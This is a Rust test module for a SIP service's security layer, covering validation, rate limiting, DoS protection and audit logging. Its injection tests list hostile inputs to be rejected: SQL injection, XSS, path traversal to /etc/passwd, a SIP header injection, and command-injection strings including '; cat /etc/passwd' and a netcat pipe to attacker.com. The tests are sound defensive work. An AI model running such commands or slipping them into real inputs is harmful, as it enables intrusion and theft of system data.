//! Security tests and vulnerability checks
//! 
//! This module contains comprehensive security tests to validate
//! that our security measures are working correctly.

#[cfg(test)]
mod tests {
    use super::super::*;
    use crate::security::validation::*;
    use crate::security::rate_limiting::*;
    use crate::security::audit::*;
    use std::net::{IpAddr, Ipv4Addr};
    use tokio::time::{sleep, Duration};

    /// Test suite for input validation
    mod validation_tests {
        use super::*;

        #[test]
        fn test_phone_number_validation_security() {
            // Valid phone numbers should pass
            assert!(validate_phone_number("+1234567890").is_ok());
            assert!(validate_phone_number("1234567890").is_ok());
            
            // Test injection attempts
            assert!(validate_phone_number("'; DROP TABLE users; --").is_err());
            assert!(validate_phone_number("<script>alert('xss')</script>").is_err());
            assert!(validate_phone_number("../../../etc/passwd").is_err());
            
            // Test buffer overflow attempts
            let long_number = "1".repeat(1000);
            assert!(validate_phone_number(&long_number).is_err());
            
            // Test null bytes and control characters
            assert!(validate_phone_number("123\x00456").is_err());
            assert!(validate_phone_number("123\r\n456").is_err());
        }

        #[test]
        fn test_ip_validation_security() {
            // Valid IPs should pass
            assert!(validate_ip_address("192.168.1.1").is_ok());
            assert!(validate_ip_address("10.0.0.1").is_ok());
            
            // Dangerous IPs should be blocked
            assert!(validate_ip_address("127.0.0.1").is_err()); // localhost
            assert!(validate_ip_address("224.0.0.1").is_err()); // multicast
            
            // Invalid formats should be rejected
            assert!(validate_ip_address("999.999.999.999").is_err());
            assert!(validate_ip_address("not.an.ip.address").is_err());
            assert!(validate_ip_address("192.168.1.1'; DROP TABLE").is_err());
        }

        #[tokio::test]
        async fn test_sip_message_validation() {
            let config = SecurityConfig::default();
            let validator = SipMessageValidator::new(&config).unwrap();
            
            // Valid SIP INVITE message
            let valid_invite = b"INVITE sip:user@example.com SIP/2.0\r\n\
                               Via: SIP/2.0/UDP 192.168.1.1:5060\r\n\
                               From: <sip:caller@example.com>\r\n\
                               To: <sip:callee@example.com>\r\n\
                               Call-ID: test-call-123\r\n\
                               CSeq: 1 INVITE\r\n\
                               \r\n";
            
            assert!(validator.validate_sip_message(valid_invite).is_ok());
            
            // Test message too large
            let large_message = format!("INVITE sip:user@example.com SIP/2.0\r\n\
                                       X-Large-Header: {}\r\n\
                                       \r\n", "A".repeat(100000));
            assert!(matches!(
                validator.validate_sip_message(large_message.as_bytes()),
                Err(SecurityError::RequestTooLarge(_))
            ));
            
            // Test invalid method
            let invalid_method = b"HACK sip:user@example.com SIP/2.0\r\n\
                                 Via: SIP/2.0/UDP 192.168.1.1:5060\r\n\
                                 \r\n";
            assert!(matches!(
                validator.validate_sip_message(invalid_method),
                Err(SecurityError::InvalidInput(_))
            ));
            
            // Test header injection attempt
            let header_injection = b"INVITE sip:user@example.com SIP/2.0\r\n\
                                   From: <sip:caller@example.com>\r\nX-Injected: evil\r\n\
                                   To: <sip:callee@example.com>\r\n\
                                   \r\n";
            assert!(matches!(
                validator.validate_sip_message(header_injection),
                Err(SecurityError::InvalidInput(_))
            ));
        }

        #[test]
        fn test_string_sanitization() {
            // Test control character removal
            assert_eq!(sanitize_string("Hello\x00World\x1F", 20), "HelloWorld");
            
            // Test length limiting
            assert_eq!(sanitize_string("This is a very long string", 10), "This is a ");
            
            // Test non-ASCII character filtering
            assert_eq!(sanitize_string("Hello 世界 World", 20), "Hello  World");
            
            // Test empty string
            assert_eq!(sanitize_string("", 10), "");
        }
    }

    /// Test suite for rate limiting
    mod rate_limiting_tests {
        use super::*;

        #[tokio::test]
        async fn test_rate_limiting_functionality() {
            let config = SecurityConfig {
                max_requests_per_minute: 3,
                enable_rate_limiting: true,
                ..Default::default()
            };
            
            let limiter = RateLimiter::new(config);
            let ip = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 100));
            
            // First three requests should pass
            assert!(limiter.check_rate_limit(ip).await.is_ok());
            assert!(limiter.check_rate_limit(ip).await.is_ok());
            assert!(limiter.check_rate_limit(ip).await.is_ok());
            
            // Fourth request should be rate limited
            assert!(matches!(
                limiter.check_rate_limit(ip).await,
                Err(SecurityError::RateLimitExceeded)
            ));
        }

        #[tokio::test]
        async fn test_connection_limiting() {
            let config = SecurityConfig {
                max_connections_per_ip: 2,
                ..Default::default()
            };
            
            let limiter = Arc::new(RateLimiter::new(config));
            let ip = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 101));
            
            // First two connections should succeed
            let _conn1 = ConnectionTracker::new(limiter.clone(), ip).await.unwrap();
            let _conn2 = ConnectionTracker::new(limiter.clone(), ip).await.unwrap();
            
            // Third connection should be rejected
            assert!(matches!(
                ConnectionTracker::new(limiter.clone(), ip).await,
                Err(SecurityError::RateLimitExceeded)
            ));
        }

        #[tokio::test]
        async fn test_dos_protection() {
            let config = SecurityConfig {
                max_requests_per_minute: 1,
                max_connections_per_ip: 1,
                enable_rate_limiting: true,
                ..Default::default()
            };
            
            let dos_protection = DosProtection::new(config);
            let ip = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 102));
            
            // First connection should succeed
            let _conn1 = dos_protection.check_request(ip).await.unwrap();
            
            // Second connection should trigger DoS protection
            assert!(matches!(
                dos_protection.check_request(ip).await,
                Err(SecurityError::RateLimitExceeded)
            ));
            
            // IP should now be temporarily blocked
            sleep(Duration::from_millis(100)).await;
            assert!(matches!(
                dos_protection.check_request(ip).await,
                Err(SecurityError::AccessDenied)
            ));
        }
    }

    /// Test suite for audit logging
    mod audit_tests {
        use super::*;
        use tempfile::tempdir;

        #[tokio::test]
        async fn test_audit_logging() {
            let temp_dir = tempdir().unwrap();
            let log_file = temp_dir.path().join("test-audit.log");
            
            let logger = SecurityAuditLogger::new(log_file.clone());
            let context = SecurityContext::new(IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1)));
            
            // Test authentication audit
            logger.log_auth_attempt(
                &context,
                Some("test_user".to_string()),
                "password".to_string(),
                true,
                None,
            ).await.unwrap();
            
            // Test security violation audit
            logger.log_security_violation(
                &context,
                "rate_limit_exceeded".to_string(),
                "Too many requests from IP".to_string(),
                SecurityViolationSeverity::Medium,
                None,
            ).await.unwrap();
            
            // Verify entries were logged
            let entries = logger.get_recent_entries(10).await;
            assert_eq!(entries.len(), 2);
            
            // Verify file was written
            assert!(log_file.exists());
            let content = std::fs::read_to_string(&log_file).unwrap();
            assert!(content.contains("test_user"));
            assert!(content.contains("rate_limit_exceeded"));
        }

        #[tokio::test]
        async fn test_audit_search() {
            let temp_dir = tempdir().unwrap();
            let log_file = temp_dir.path().join("test-search-audit.log");
            
            let logger = SecurityAuditLogger::new(log_file);
            let ip1 = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1));
            let ip2 = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 2));
            
            let context1 = SecurityContext::new(ip1).with_auth("user1".to_string(), "session1".to_string());
            let context2 = SecurityContext::new(ip2).with_auth("user2".to_string(), "session2".to_string());
            
            // Log events from different IPs and users
            logger.log_auth_attempt(&context1, Some("user1".to_string()), "password".to_string(), true, None).await.unwrap();
            logger.log_auth_attempt(&context2, Some("user2".to_string()), "password".to_string(), false, Some("invalid_password".to_string())).await.unwrap();
            
            // Search by IP
            let ip1_entries = logger.search_entries(Some(ip1), None, None, None, 10).await;
            assert_eq!(ip1_entries.len(), 1);
            
            // Search by user
            let user2_entries = logger.search_entries(None, Some("user2".to_string()), None, None, 10).await;
            assert_eq!(user2_entries.len(), 1);
        }
    }

    /// Integration security tests
    mod integration_tests {
        use super::*;

        #[tokio::test]
        async fn test_comprehensive_security_flow() {
            // Initialize security subsystem
            let config = SecurityConfig {
                enable_audit_logging: true,
                enable_rate_limiting: true,
                enable_input_validation: true,
                max_requests_per_minute: 5,
                max_connections_per_ip: 2,
                ..Default::default()
            };
            
            initialize_security(&config).unwrap();
            
            // Test DoS protection with audit logging
            let dos_protection = DosProtection::new(config.clone());
            let ip = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 200));
            
            // Make several requests to trigger rate limiting
            for i in 0..7 {
                let result = dos_protection.check_request(ip).await;
                if i < 2 {
                    // First 2 should succeed
                    assert!(result.is_ok(), "Request {} should succeed", i);
                } else {
                    // Remaining should be rate limited
                    assert!(result.is_err(), "Request {} should be rate limited", i);
                }
            }
            
            // Verify statistics
            let stats = dos_protection.get_stats().await;
            assert_eq!(stats.blocked_ips, 1);
            assert!(stats.rate_limiter.total_connections >= 2);
        }

        #[tokio::test]
        async fn test_memory_exhaustion_protection() {
            let config = SecurityConfig {
                max_sip_message_size: 1024, // Small limit for testing
                ..Default::default()
            };
            
            let validator = SipMessageValidator::new(&config).unwrap();
            
            // Create a message that exceeds the limit
            let large_header = "X-Large: ".to_string() + &"A".repeat(2000);
            let large_message = format!("INVITE sip:user@example.com SIP/2.0\r\n{}\r\n\r\n", large_header);
            
            // Should be rejected due to size
            assert!(matches!(
                validator.validate_sip_message(large_message.as_bytes()),
                Err(SecurityError::RequestTooLarge(_))
            ));
        }

        #[tokio::test]
        async fn test_injection_attack_prevention() {
            // Test SQL injection patterns
            assert!(validate_phone_number("'; DROP TABLE users; --").is_err());
            assert!(validate_phone_number("1' UNION SELECT * FROM passwords --").is_err());
            
            // Test XSS patterns
            assert!(validate_phone_number("<script>alert('xss')</script>").is_err());
            assert!(validate_phone_number("javascript:alert(1)").is_err());
            
            // Test path traversal
            assert!(validate_phone_number("../../../etc/passwd").is_err());
            assert!(validate_phone_number("..\\..\\windows\\system32").is_err());
            
            // Test command injection
            assert!(validate_phone_number("; cat /etc/passwd").is_err());
            assert!(validate_phone_number("| nc attacker.com 4444").is_err());
        }
    }
}